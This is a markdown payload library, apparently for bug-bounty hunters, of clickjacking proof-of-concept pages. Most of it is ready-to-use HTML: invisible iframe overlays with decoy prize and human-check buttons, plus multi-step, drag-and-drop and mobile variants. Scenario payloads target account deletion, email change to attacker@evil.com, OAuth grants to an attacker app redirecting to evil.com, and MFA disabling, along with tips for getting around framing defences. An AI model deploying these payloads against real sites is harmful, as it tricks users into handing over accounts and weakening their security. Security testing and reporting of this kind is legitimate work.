---
id: "clickjacking-payloads"
title: "Clickjacking Payload & PoC Library"
type: "payload"
category: "web-application"
subcategory: "client-side"
tags: ["clickjacking", "iframe", "ui-redress", "x-frame-options", "csp-frame-ancestors", "drag-drop", "css-opacity", "multi-step", "deep-dig"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["csrf-modern", "xss-techniques", "cors-misconfiguration"]
updated: "2026-04-14"
---

## Overview

Clickjacking (UI redress) tricks users into clicking hidden elements on a target page by overlaying transparent iframes. Alone: low-medium severity. Chained with state-changing actions (delete account, change email, enable admin, authorize OAuth): high severity. Most programs require demonstrating an actual state-changing action, not just "the page is frameable."

## Basic PoC Template

```html
<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
<style>
    #target {
        position: relative;
        width: 100%;
        height: 600px;
        opacity: 0.0001;
        z-index: 2;
        border: none;
    }
    #decoy {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 600px;
        z-index: 1;
    }
    .container {
        position: relative;
        width: 800px;
        margin: 0 auto;
    }
</style>
</head>
<body>
<div class="container">
    <div id="decoy">
        <h1>Click the button to claim your prize!</h1>
        <button style="position:absolute; top:300px; left:350px; font-size:20px; padding:15px 30px;">
            Claim Prize
        </button>
    </div>
    <iframe id="target" src="https://target.com/settings/delete-account"></iframe>
</div>
</body>
</html>
```

## Opacity Variations

```html
<!-- Nearly invisible (bypasses Chrome threshold detection) -->
<iframe style="opacity: 0.0001;" src="https://target.com/action"></iframe>

<!-- Fully transparent -->
<iframe style="opacity: 0;" src="https://target.com/action"></iframe>

<!-- Using CSS filter instead of opacity -->
<iframe style="filter: alpha(opacity=0);" src="https://target.com/action"></iframe>

<!-- CSS mix-blend-mode trick -->
<iframe style="mix-blend-mode: difference; opacity: 0.5;" src="https://target.com/action"></iframe>

<!-- Using clip to show only the button area -->
<iframe style="clip: rect(280px, 450px, 340px, 300px); position: absolute;" src="https://target.com/action"></iframe>

<!-- Using clip-path -->
<iframe style="clip-path: circle(30px at 375px 310px);" src="https://target.com/action"></iframe>
```

## Multi-Step Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
<title>Multi-Step Clickjacking PoC</title>
<style>
    #target {
        position: absolute;
        opacity: 0.0001;
        z-index: 2;
        width: 800px;
        height: 600px;
        border: none;
    }
    .step { display: none; position: absolute; z-index: 1; }
    .step.active { display: block; }
    .btn { font-size: 18px; padding: 10px 25px; cursor: pointer; }
</style>
</head>
<body>

<!-- Step 1: Click "Settings" button position -->
<div id="step1" class="step active">
    <h2>Step 1: Click to continue</h2>
    <button class="btn" style="position:absolute; top:50px; left:200px;" 
            onclick="nextStep(2)">Continue</button>
</div>

<!-- Step 2: Click "Delete Account" button position -->
<div id="step2" class="step">
    <h2>Step 2: Confirm your entry</h2>
    <button class="btn" style="position:absolute; top:300px; left:350px;"
            onclick="nextStep(3)">Confirm</button>
</div>

<!-- Step 3: Click "Yes, I'm sure" button position -->
<div id="step3" class="step">
    <h2>Step 3: Final verification</h2>
    <button class="btn" style="position:absolute; top:250px; left:300px;">
        Verify
    </button>
</div>

<iframe id="target" src="https://target.com/settings"></iframe>

<script>
function nextStep(n) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + n).classList.add('active');
}
</script>
</body>
</html>
```

## Drag-and-Drop Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
<title>Drag-and-Drop Clickjacking</title>
<style>
    #source {
        width: 200px; height: 50px; background: #4CAF50;
        color: white; text-align: center; line-height: 50px; cursor: move;
    }
    #target-frame {
        opacity: 0.0001; position: absolute;
        top: 0; left: 0; width: 100%; height: 100%; z-index: 2;
    }
    #drop-zone {
        width: 300px; height: 100px; border: 2px dashed #ccc;
        text-align: center; line-height: 100px; margin-top: 20px;
    }
</style>
</head>
<body>
<h2>Drag the token to the box to verify</h2>
<div id="source" draggable="true" 
     ondragstart="event.dataTransfer.setData('text/plain', 'malicious_data')">
    Drag Me
</div>
<div id="drop-zone">Drop Here</div>
<iframe id="target-frame" src="https://target.com/admin/add-user"></iframe>
</body>
</html>
```

## Touch-Based Clickjacking (Mobile)

```html
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    #target {
        position: absolute; opacity: 0.0001; z-index: 2;
        width: 100%; height: 100%; border: none;
    }
    .tap-target {
        position: absolute; z-index: 1; width: 100%; text-align: center; top: 50%;
    }
</style>
</head>
<body>
<div class="tap-target">
    <h2>Tap to verify you are human</h2>
    <button style="font-size:24px; padding:20px 40px;">Verify</button>
</div>
<iframe id="target" src="https://target.com/m/authorize?scope=admin"></iframe>
</body>
</html>
```

## Specific Attack Scenarios

### Delete account
```html
<iframe style="opacity:0.0001; position:absolute; top:0; left:0; width:100%; height:100%;"
        src="https://target.com/settings/account/delete?confirm=true"></iframe>
<button style="position:absolute; top:350px; left:400px; z-index:1;">
    Click here for a free gift!
</button>
```

### Change email
```html
<iframe style="opacity:0.0001; position:absolute;"
        src="https://target.com/settings/email?new_email=attacker@evil.com"></iframe>
```

### OAuth authorization
```html
<iframe style="opacity:0.0001; position:absolute;"
        src="https://target.com/oauth/authorize?client_id=ATTACKER_APP&scope=all&redirect_uri=https://evil.com/callback"></iframe>
```

### Disable MFA
```html
<iframe style="opacity:0.0001; position:absolute;"
        src="https://target.com/settings/security/disable-mfa"></iframe>
```

## X-Frame-Options Bypass Techniques

### Double framing (SAMEORIGIN check)
```html
<!-- Some implementations only check immediate parent, not top-level -->
<!-- If you have XSS on subdomain: -->
<iframe src="https://subdomain.target.com/xss?payload=<iframe src='https://target.com/action'></iframe>">
</iframe>
```

### Path-specific header gaps
```
# Check all pages, not just the main page
# /settings may have X-Frame-Options but /api/settings may not
# /v1/action may have it but /v2/action may not
# /mobile/action may lack it entirely
```

### CSP frame-ancestors bypass
```
# If CSP uses frame-ancestors 'self'
# Try from same origin (XSS on subdomain)
# If frame-ancestors allows specific domains, check if any are compromisable
# frame-ancestors 'none' is strongest but often not set
```

## SameSite Cookie Interaction

```
# SameSite=Lax: cookies NOT sent in iframes -> user not logged in
# SameSite=None; Secure: cookies sent everywhere -> clickjacking viable
# SameSite=Strict: cookies never sent cross-site

# Check SameSite attribute on session cookies
# If SameSite=None; Secure -> clickjacking works with auth
# If SameSite=Lax or Strict -> user won't be authenticated in iframe
# Bypass: same-site via subdomain XSS, or target unauthenticated actions
```

## Reporting Tips

```
# Most programs will NOT accept:
# - "This page can be framed" without demonstrating impact
# - Clickjacking on pages with no state-changing actions
# - Clickjacking where SameSite=Lax prevents auth

# Programs WILL accept:
# - Clickjacking leading to account deletion
# - Clickjacking leading to email/password change
# - Clickjacking leading to OAuth authorization
# - Clickjacking leading to privilege escalation
# - Multi-step clickjacking with clear PoC
```

## Tools

- **clickjacker.io** -- Online clickjacking PoC generator
- **Burp Suite** -- Check X-Frame-Options and CSP headers
- **nuclei** -- Clickjacking detection templates
- **Browser DevTools** -- Test iframe embedding manually
